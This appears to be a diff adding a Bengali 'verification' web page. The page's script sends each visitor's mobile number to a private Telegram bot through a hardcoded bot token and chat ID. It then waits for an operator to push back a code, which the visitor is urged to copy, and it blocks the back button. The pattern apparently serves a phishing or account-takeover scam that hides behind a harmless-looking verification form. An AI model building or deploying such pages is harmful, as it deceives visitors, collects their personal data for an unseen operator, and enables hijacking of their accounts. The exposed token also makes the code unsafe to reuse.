@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ভেরিফিকেশন পেজ</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .hero-image {
+            width: 100%;
+            height: 250px;
+            object-fit: cover;
+            border-bottom: 3px solid #0088cc;
+        }
+
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+            margin-top: -40px;
+            position: relative;
+            z-index: 10;
+        }
+
+        h3 {
+            margin-top: 0;
+            color: #333;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        input[type="tel"] {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            box-sizing: border-box;
+            margin-bottom: 20px;
+            text-align: center;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input[type="tel"]:focus { border-color: #0088cc; }
+
+        button {
+            width: 100%;
+            background-color: #0088cc;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover { background-color: #006699; }
+
+        /* অপেক্ষার স্ক্রিন */
+        #waiting-screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px 0;
+        }
+
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #0088cc;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* কোড দেখানোর স্ক্রিন */
+        #code-screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .code-box {
+            background-color: #e8f4fd;
+            border: 2px dashed #0088cc;
+            padding: 15px 30px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #0088cc;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            letter-spacing: 2px;
+        }
+
+        .copy-btn {
+            background-color: #28a745;
+        }
+        .copy-btn:hover { background-color: #218838; }
+
+        /* কপি সাকসেস মেসেজ */
+        #toast {
+            display: none;
+            color: green;
+            margin-top: 15px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ওয়েবসাইটের কভার ছবি -->
+    <img src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" alt="Cover Image" class="hero-image">
+
+    <div class="container">
+        
+        <!-- ১. নাম্বার দেওয়ার ফর্ম -->
+        <div id="main-form">
+            <h3>অনুগ্রহ করে আপনার মোবাইল নাম্বার দিন</h3>
+            <input type="tel" id="phoneNumber" placeholder="যেমন: 017XXXXXXXX" required>
+            <button onclick="submitNumber()">ওকে</button>
+        </div>
+
+        <!-- ২. অপেক্ষার স্ক্রিন -->
+        <div id="waiting-screen">
+            <div class="loader"></div>
+            <h3 style="color: #0088cc; margin-bottom: 5px;">অপেক্ষা করুন...</h3>
+            <p style="font-size: 14px; color: #666; margin: 0;">অল্প কিছুক্ষণ এর মধ্যে আপনার কোডটি তৈরি হচ্ছে।</p>
+        </div>
+
+        <!-- ৩. কোড রিসিভ ও কপি করার স্ক্রিন -->
+        <div id="code-screen">
+            <h3>আপনার ভেরিফিকেশন কোড:</h3>
+            <div class="code-box" id="display-code">------</div>
+            <button class="copy-btn" onclick="copyCode()">কপি করুন (Copy)</button>
+            <div id="toast">✅ কোড কপি করা হয়েছে!</div>
+        </div>
+
+    </div>
+
+    <script>
+        const botToken = '8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk';
+        const chatId = '8516934257';
+        let pollingInterval;
+        let requestTime = 0; // ইউজার কখন ওকে চাপলো তার সময়
+
+        // নাম্বার সাবমিট করার ফাংশন
+        function submitNumber() {
+            const number = document.getElementById('phoneNumber').value;
+            if(number.trim() === "") {
+                alert("দয়া করে আপনার নাম্বারটি লিখুন!");
+                return;
+            }
+
+            // বাটন চাপার সময়টা সেভ করে রাখা হচ্ছে (যাতে আগের কোড না আসে)
+            requestTime = Math.floor(Date.now() / 1000); 
+
+            // ফর্ম লুকিয়ে ওয়েটিং স্ক্রিন দেখাবে
+            document.getElementById('main-form').style.display = 'none';
+            document.getElementById('waiting-screen').style.display = 'flex';
+
+            // টেলিগ্রামে মেসেজ পাঠানো
+            const messageText = `📞 নতুন রিকোয়েস্ট:\n📱 নাম্বার: ${number}\n\n💡 কোড পাঠাতে নিচে টাইপ করুন:\n/send আপনার_কোড`;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: messageText })
+            })
+            .then(response => response.json())
+            .then(data => {
+                // মেসেজ যাওয়ার পর টেলিগ্রাম চেক করা শুরু করবে
+                startPolling();
+            });
+        }
+
+        // টেলিগ্রাম থেকে রিপ্লাই চেক করার ফাংশন (প্রতি ৩ সেকেন্ড পর পর)
+        function startPolling() {
+            let lastUpdateId = 0;
+
+            pollingInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok && data.result.length > 0) {
+                        for (let item of data.result) {
+                            lastUpdateId = item.update_id;
+                            
+                            // যদি টেলিগ্রাম থেকে /send কমান্ড দিয়ে মেসেজ আসে
+                            if (item.message && item.message.text && item.message.text.startsWith('/send ')) {
+                                
+                                // **মূল পরিবর্তন:** শুধুমাত্র রিকোয়েস্ট করার পরে পাঠানো কোডই গ্রহণ করবে
+                                if (item.message.date >= requestTime) {
+                                    const receivedCode = item.message.text.replace('/send ', '').trim();
+                                    showCodeScreen(receivedCode);
+                                }
+                            }
+                        }
+                    }
+                });
+            }, 3000); 
+        }
+
+        // কোড স্ক্রিনে দেখানোর ফাংশন
+        function showCodeScreen(code) {
+            clearInterval(pollingInterval); // চেকিং বন্ধ করা
+            
+            document.getElementById('waiting-screen').style.display = 'none';
+            document.getElementById('code-screen').style.display = 'flex';
+            document.getElementById('display-code').innerText = code;
+
+            // **ব্যাক বাটন প্রোটেকশন:** পেজ থেকে ব্যাক করলে পেজ রিলোড হয়ে মুছে যাবে
+            window.history.pushState({page: "code"}, "Code Screen", "");
+            window.addEventListener("popstate", function(e) {
+                window.location.reload(); 
+            });
+        }
+
+        // কোড কপি করার ফাংশন
+        function copyCode() {
+            const codeToCopy = document.getElementById('display-code').innerText;
+            navigator.clipboard.writeText(codeToCopy).then(() => {
+                const toast = document.getElementById('toast');
+                toast.style.display = 'block';
+                setTimeout(() => { toast.style.display = 'none'; }, 3000);
+            });
+        }
+    </script>
+
+</body>
+</html>
